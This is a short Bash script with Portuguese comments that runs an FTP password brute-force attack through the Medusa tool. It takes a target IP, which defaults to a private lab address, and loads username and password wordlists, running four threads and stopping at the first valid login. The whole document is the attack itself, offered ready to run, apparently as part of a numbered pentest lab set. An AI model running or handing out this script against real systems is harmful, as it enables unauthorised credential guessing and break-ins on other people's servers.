#!/bin/bash
# Ataque de força bruta em FTP via Medusa
# Uso: ./01_ftp_bruteforce.sh <IP_ALVO>

ALVO=${1:-"192.168.56.101"}
USUARIOS="../wordlists/usuarios.txt"
SENHAS="../wordlists/senhas.txt"

echo "[*] Iniciando força bruta FTP em $ALVO"
echo "[*] Usuários: $USUARIOS | Senhas: $SENHAS"
echo ""

medusa -h "$ALVO" \
       -U "$USUARIOS" \
       -P "$SENHAS" \
       -M ftp \
       -t 4 \
       -f \
       -v 6

echo ""
echo "[*] Concluído. Valide o acesso com: ftp $ALVO"
